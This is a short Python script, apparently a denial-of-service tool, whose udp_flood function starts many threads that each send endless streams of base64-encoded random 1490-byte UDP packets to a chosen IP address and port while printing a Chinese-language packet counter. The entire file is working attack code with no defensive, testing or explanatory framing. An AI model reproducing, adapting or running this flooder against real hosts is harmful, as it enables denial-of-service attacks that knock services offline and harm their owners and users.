import base64
import random
import socket
import threading
from time import sleep

flag = 1


def send(ip, port):
    global flag
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    sent = 0
    while True:
        if flag == 1:
            send_bytes = random._urandom(1490)
            send_bytes = base64.b64encode(send_bytes)

            sock.sendto(send_bytes, (ip, port))
            sent = sent + 1
            print("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))
        else:
            sleep(3)
            flag = 1
            return 0


def udp_flood(ip, port, ts):
    threads = []
    for i in range(ts):
        threads.append(threading.Thread(target=send, args=(ip, port)))
    print(threads)
    for th in threads:
        th.start()
